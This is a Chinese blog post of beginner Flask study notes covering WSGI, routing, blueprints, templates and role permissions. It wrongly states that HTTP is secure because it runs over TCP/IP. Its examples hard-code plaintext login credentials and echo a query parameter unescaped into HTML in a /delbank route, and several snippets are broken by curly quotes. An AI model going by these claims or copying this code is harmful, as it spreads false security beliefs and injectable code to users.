安装requirements.txt中的依赖库</span><br><span class="line"></span><br><span class="line">  - 启动项目</span><br><span class="line"></span><br><span class="line">  - 接收开发任务</span><br><span class="line"></span><br><span class="line">  - 任务code开发完成后，本地提交，上传到服务器（先更新，再上传）</span><br><span class="line"></span><br><span class="line">  - 第二天：开发新的任务之前，先更新代码（别人新增的任务）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-1-任务（用户、角色和权限的关系模型）"><a href="#2-1-任务（用户、角色和权限的关系模型）" class="headerlink" title="2.1 任务（用户、角色和权限的关系模型）"></a>2.1 任务（用户、角色和权限的关系模型）</h3><p>增加用户角色：id，角色名称</p>
<ul>
<li><ol>
<li>系统管理员</li>
<li>普通用户</li>
</ol>
</li>
</ul>
<p>增加用户权限：id、名称</p>
<ul>
<li><ol>
<li>delete_user</li>
<li>create_user</li>
<li>read_user</li>
<li>update_user</li>
<li>create_db</li>
<li>drop_db</li>
</ol>
</li>
</ul>
<p>用户和角色的关系：多对多，一个用户有n个角色，一个角色有多个用户。</p>
<p>角色和权限的关系：多对多，一个角色包含多个权限，一个权限被多个角色使用。</p>
<p>勾子函数@app_before_request验证操作权限：在”/drop_db”操作时验证当前用户是否具备管理员的角色及删除表的权限</p>
<h2 id="三、用户登录之token"><a href="#三、用户登录之token" class="headerlink" title="三、用户登录之token"></a>三、用户登录之token</h2><p>要求：当用户登录成功之后，通过uuid生成用户对应的token（身份令牌）。</p>
<p>客户端：cookie存储token</p>
<p>服务端：redis缓存存储token</p>
<h1 id="WEB应用开发-Flask第七天"><a href="#WEB应用开发-Flask第七天" class="headerlink" title="WEB应用开发-Flask第七天"></a>WEB应用开发-Flask第七天</h1><h2 id="一、Ajax实现头像上传"><a href="#一、Ajax实现头像上传" class="headerlink" title="一、Ajax实现头像上传"></a>一、Ajax实现头像上传</h2><h3 id="1-1-文件上传的两种方式【了解】"><a href="#1-1-文件上传的两种方式【了解】" class="headerlink" title="1.1 文件上传的两种方式【了解】"></a>1.1 文件上传的两种方式【了解】</h3><ul>
<li>表单标签方式上传，使用form标签和input的file类型的标签</li>
<li>Ajax的DataForm方式上传文件</li>
</ul>
<h3 id="1-2-表单标签的方式上传文件"><a href="#1-2-表单标签的方式上传文件" class="headerlink" title="1.2 表单标签的方式上传文件"></a>1.2 表单标签的方式上传文件</h3><p>要求：form标签的enctype为“multipart/form-data”，且method=’post’</p>
<h3 id="1-3-Ajax方式上传文件"><a href="#1-3-Ajax方式上传文件" class="headerlink" title="1.3 Ajax方式上传文件"></a>1.3 Ajax方式上传文件</h3><h2 id="二、Flask相关知识点"><a href="#二、Flask相关知识点" class="headerlink" title="二、Flask相关知识点"></a>二、Flask相关知识点</h2><ol>
<li><p>flask中日志</p>
<p><strong>日志的等级</strong>：logging.NOST - 0, DEBUG - 10, INFO - 20, WARNING - 30, ERROR - 40, CRITICAL - 50</p>
<p>可以删除flask的默认日志处理器，可以增加自己的处理Handler</p>
<p>常用的处理器Handler: </p>
<ul>
<li>logging.StreamHandler/FileHandler</li>
<li>logging.handlers.HTTPHandler/SMTPHandler</li>
</ul>
<p>app.logger.info()</p>
<p>??blue.logger.info()</p>
</li>
<li><p>分页查询</p>
</li>
<li><p>页面缓存：n秒内访问的页面不会多次渲染。</p>
</li>
<li><p>flask-restful</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/python-web-flask-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/python-web-flask-1/" class="post-title-link" itemprop="url">python-web-flask-1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-23 13:58:42" itemprop="dateModified" datetime="2022-06-23T13:58:42+08:00">2022-06-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="WEB应用开发-Flask第一天"><a href="#WEB应用开发-Flask第一天" class="headerlink" title="WEB应用开发-Flask第一天"></a>WEB应用开发-Flask第一天</h1><h2 id="一、WEB应用服务的认知"><a href="#一、WEB应用服务的认知" class="headerlink" title="一、WEB应用服务的认知"></a>一、WEB应用服务的认知</h2><p>flask开发文档： <a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/quickstart.html">http://docs.jinkan.org/docs/flask/quickstart.html</a></p>
<p>WEB应用服务基于HTTP协议/规范，实现静态资源和动态资源的请求与处理，静态资源包含html网页、图片、样式、javascript脚本、视频、音频等等。动态资源即通过程序（java/php/python/.net）和数据库（mysql/oracle/sqlsever）根据业务处理流程会动态的生成html，再将html响应给请求（客户端）。</p>
<p>HTTP(1.0、1.1、2.0)和HTML的关系：</p>
<p>\1. 客户端封装Http请求（HttpRequest），向服务端发起请求</p>
<p>\2. 服务端接收请求之后，分析资源请求的路径、请求参数（查询参数、表单参数、json/字节流）、请求方法、请求头等。</p>
<p>\3. 服务端根据资源的请求路径读取文件的内容，并生成字节码数据且封装响应对象(HttpResponse)</p>
<p>\4. 客户端接收服务端的响应数据（HttpResponse），判断请求是否成功，如果成功则显示数据（html/json）。</p>
<p>WEB应用服务：</p>
<p>\1. 客户端（Browser浏览器）发起请求（HttpRequest）</p>
<p>\2. 服务端(Apache/Nginx/PythonWeb)接收请求，根据请求的资源信息，读取文件，并封装到响应对象（HttpResponse）中。</p>
<p>\3. 客户端接收资源，分析资源的类型然后渲染并显示出来。</p>
<p>另外，WEB应用服务基于HTTP协议，HTTP协议又基于TCP/IP协议，因此是安全性连接。</p>
<p>应用层/表示层/会话层/传输层/网络层/数据链路层/物理层</p>
<h2 id="二、Python-Web开发框架"><a href="#二、Python-Web开发框架" class="headerlink" title="二、Python Web开发框架"></a>二、Python Web开发框架</h2><p>Python本身实现WEB应用服务的接口（规范），便于我们开发动态资源请求。提供的开发模块是wsgiref。此模块是所有其他高级框架中最核心的，最基本的规范，如Flask基于Werkzeug库实现了wsgi通信协议。</p>
<p>WSGI: Web Server Gataway Interface - WEB服务网关接口，负责http协议的底层通信。</p>
<p>Python WEB开发框架：Django（组件最全、最强大的框架，主要用于后端服务管理、运维（Ansible/Openstack））；Flask小巧的、灵活的框架、可以快速开发API接口；Tornado是基于协程和单线程单进程的框架实现非阻塞的网络框架。Sanic是性能最优的WEB非阻塞框架。</p>
<p>Python wsgi 案例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app</span>(<span class="params">enviro, start_response</span>):</span><br><span class="line">	<span class="comment"># 核心业务</span></span><br><span class="line"><span class="comment"># 生成响应的对象</span></span><br><span class="line">start_response(‘HTTP/<span class="number">1.1</span> <span class="number">200</span> OK’, [(‘content-<span class="built_in">type</span>’, ‘text/html’), ()]) <span class="comment">#响应头</span></span><br><span class="line"><span class="keyword">return</span> [‘&lt;h3&gt;hello, wsgi&lt;/h3&gt;’.encode(‘utf-<span class="number">8</span>’)]</span><br><span class="line"></span><br><span class="line">httpd = make_server(‘<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>’, <span class="number">8000</span>, app)</span><br><span class="line">Httpd.serve_forever(poll_interval=<span class="number">0.5</span>)  <span class="comment"># 轮询监听的间隔时间</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>* make_server() 是创建WEB服务进程</p>
<p>* app()函数的enviro是environment的简写，表示请求的环境信息，是字典类型。</p>
<p>* app()函数在返回数据之前，需要生成响应头信息即start_response(‘200 OK’, [(header-key, value)])</p>
<h2 id="三、Flask框架的应用"><a href="#三、Flask框架的应用" class="headerlink" title="三、Flask框架的应用"></a>三、Flask框架的应用</h2><p>1.1 安装环境</p>
<p>(apiserver) &gt; pip install flask</p>
<p>1.2 第一个Flask项目</p>
<p>创建server2.py脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="comment"># 创建Flask对象-Httpd WEB服务对象</span></span><br><span class="line">app = Flask(<span class="string">&#x27;hiflask&#x27;</span>) <span class="comment"># __name__可以是任意的小写字母，表示Flask应用对象名称</span></span><br><span class="line"><span class="comment"># 声明WEB服务的请求资源(指定资源访问的路由)（动态的）</span></span><br><span class="line"><span class="comment"># RESTful 设计风格中关于资源的动作：&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, &#x27;PATCH&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="comment"># 获取平台参数：platform</span></span><br><span class="line">    <span class="comment"># 只支持Android手机访问</span></span><br><span class="line">    platform = request.args.get(<span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;pc&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> platform.lower() != <span class="string">&#x27;android&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;目前只支持Android设备&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">    <span class="comment"># request是请求对象(HttpRequest)，它包含请求资源的路径，请求方法，请求头，上传的表单数据，文件等信息。</span></span><br><span class="line">    <span class="comment"># 获取请求中的查询参数（username, password）</span></span><br><span class="line">    <span class="comment"># wsgi -&gt; query_string: username=disen&amp;password=123</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回生成的HTML网页内容</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;用户登录的信息&lt;/h1&gt; </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/hello?platform=android&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;name&quot; placeholder=&quot;用户名&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;pwd&quot; placeholder=&quot;口令&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;button&gt;提交&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># &lt;h3&gt;用户名：%s &lt;/h3&gt;</span></span><br><span class="line">        <span class="comment"># &lt;h3&gt;口令：%s &lt;/h3&gt;</span></span><br><span class="line">        <span class="comment"># % (name, password)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 获取表单的参数</span></span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        pwd = request.form.get(<span class="string">&#x27;pwd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>((</span><br><span class="line">            name.strip() == <span class="string">&#x27;qaz&#x27;</span>,</span><br><span class="line">            pwd.strip() == <span class="string">&#x27;987&#x27;</span></span><br><span class="line">        )):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2 style=&quot;color:blue;&quot;&gt;登录成功&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2 style=&quot;color:orange;&quot;&gt;登录失败, &lt;a href=&quot;/hello&quot;&gt;重试&lt;/a&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动flask的WEB服务器</span></span><br><span class="line">app.run(host=<span class="string">&quot;localhost&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p> 3.3 Flask的MVC设计思想</p>
<p>\1. 客户端发起请求之后，通过路由找到视图处理函数</p>
<p>\2. 路由（请求资源）和视图处理函数-V(Controller)事先在app中声明</p>
<p>\3. 在视图的处理函数中根据业务需求，加载数据(Model)并渲染到模板中(View)</p>
<p>\4. 将渲染之后的模板数据返回给客户端。</p>
<p>3.4 Flask特有MTV设计思想</p>
<p>MTV设计思想，基于MVC的：</p>
<p>* M-Model</p>
<p>* T-Template模板（VIEW）</p>
<p>* V-View处理函数（Controller）</p>
<p>**案例分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bank&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addBank</span>():</span><br><span class="line">    <span class="comment"># 加载数据(Model 交互操作)</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;绑定银行卡&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;error_message&#x27;</span>: <span class="string">&#x27;卡号和银行卡名称不能为空&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 渲染模板</span></span><br><span class="line">    html = render_template(<span class="string">&#x27;bank_edit.html&#x27;</span>, **data)</span><br><span class="line">    <span class="keyword">return</span> html <span class="comment"># 将数据返回给客户端</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;的页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; title &#125;&#125;的页面<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>银行名称<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>卡号<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;card_num&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; error_message &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上html文件不是静态的网页文件，而是一个动态的模板文件，页面中存在动态显示的变量。需要在视图函数中，指定数据渲染模板，渲染之后的html内容才是静态资源。</p>
<p>3.5 app.run()函数的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动flask的WEB服务器</span></span><br><span class="line">app.run(<span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="number">5000</span>,</span><br><span class="line">        <span class="literal">True</span>, <span class="comment"># 默认未开启调试模式，True开启调试模式</span></span><br><span class="line">        threaded=<span class="literal">True</span>,  <span class="comment"># 默认是单线程，即为False</span></span><br><span class="line">        processes=<span class="number">4</span>) <span class="comment"># 默认只有一个进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：多进程和多线程不能同时开启，只能选择一种，如processes=4，同时threaded=True则会报错。</span></span><br></pre></td></tr></table></figure>

<p>3.6 请求request和响应response</p>
<p>3.7 Flask-script插件</p>
<p>安装包：pip install flask-script</p>
<p>Flask需用1.1.x版本</p>
<p>在server.py使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mainapp <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 以脚本的方式启动flask应用服务</span></span><br><span class="line">    manager = Manager(app)</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure>

<p>在命令窗口运行server.py脚本</p>
<p>Python server.py runserver -d  # debug调试模式</p>
<p>3.8 flask-blueprint插件</p>
<p>blueprint插件主要实现拆分多个视图函数，让同类或同一个模块分到一个view的脚本中，如银行系统中，可以分用户模块、银行模块、交易模块等，每一个模块有它自己的view处理函数的脚本。</p>
<p>安装依赖包</p>
<p>Pip install flask-blueprint</p>
<p>在views.bank.py脚本中使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">blue = Blueprint(<span class="string">&#x27;bankBlue&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/bank&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bank</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;hi, Bank-Blue&lt;/h3&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/delbank&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_bank</span>():</span><br><span class="line">    bank_id = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;正在删除银行：%s&lt;/h3&gt;&quot;</span> % bank_id</span><br></pre></td></tr></table></figure>

<p>注意：Blueprint类从flask模块中导入。</p>
<p>在server.py脚本中注册views.bank.py中的blue蓝图对象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> mainapp <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> mainapp.views <span class="keyword">import</span> bank, user</span><br><span class="line"><span class="keyword">from</span> flask_script <span class="keyword">import</span> Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将蓝图对象注册到flask服务中</span></span><br><span class="line">    app.register_blueprint(bank.blue)</span><br><span class="line">    app.register_blueprint(user.blue, url_prefix=<span class="string">&#x27;/user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 以脚本的方式启动flask应用服务</span></span><br><span class="line">    manager = Manager(app)</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure>

<p>另外，在注册蓝图对象时，可以设置蓝图中路由访问的前缀，如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建蓝图的时候，第一个参数：name可以任意命名，第二个参数：必须使用__name__表示导包的名称</span></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;userBlue&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 声明的API接口</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/find&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h2&gt;hi, User - Blueprint&lt;/h2&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url_prefix 设置蓝图中子路由的前缀</span></span><br><span class="line">app.register_blueprint(user.blue, url_prefix=<span class="string">&#x27;/user&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>如果要访问user.py中/find路由，全路径时：<a target="_blank" rel="noopener" href="http://localhost:5000/user/find">http://localhost:5000/user/find</a>     </p>
<h1 id="WEB服务Flask第二天"><a href="#WEB服务Flask第二天" class="headerlink" title="WEB服务Flask第二天"></a>WEB服务Flask第二天</h1><h2 id="一、路由、request与response"><a href="#一、路由、request与response" class="headerlink" title="一、路由、request与response"></a>一、路由、request与response</h2><p><strong>1.1</strong> 路由规则</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params">‘/find’</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line">   <span class="keyword">return</span> “”</span><br></pre></td></tr></table></figure>

<p>请求的url是<a target="_blank" rel="noopener" href="http://localhost:5000/find%E3%80%82%E8%B7%AF%E7%94%B1%E4%B8%AD%E9%85%8D%E7%BD%AE%E7%9A%84%E8%B7%AF%E5%BE%84%E5%8D%B3%E6%98%AF%E8%AF%B7%E6%B1%82%E7%9A%84path%E8%B7%AF%E5%BE%84%E3%80%82">http://localhost:5000/find。路由中配置的路径即是请求的path路径。</a></p>
<p>如果使用“蓝图”则在注册时，可以注明它的url前缀。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.register_blueprint(bank.blue, url_prefix=”/bank”)</span><br></pre></td></tr></table></figure>

<p>通过url_prefix参数指定某一个模块下的所有请求资源，对于/find路由来说的，应该是/bank的子路径（路由），访问全路径是<a target="_blank" rel="noopener" href="http://localhost:5000/bank/find%E3%80%82">http://localhost:5000/bank/find。</a></p>
<p>1.1.1 <strong>路由中的参数</strong></p>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params">‘/find/&lt;converter:word&gt;’, methods=[‘GET’]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">word</span>):</span><br><span class="line">   <span class="keyword">return</span> “”</span><br></pre></td></tr></table></figure>

<p>converter是参数的转换器，一般是指定的类型，如string，<strong>int<strong><strong>，float</strong></strong>，path</strong>，uuid，any。</p>
<p>其中any()比较特殊，可以指定任意的类型转换器，如&lt;any(int,string,uuid):word&gt;，但目前最新的flask版本不支持any()动作，直接写成“/find/<word>”.word表示任意类型。</p>
<p>另外，path转换器主要用于引用别的网址时使用。</p>
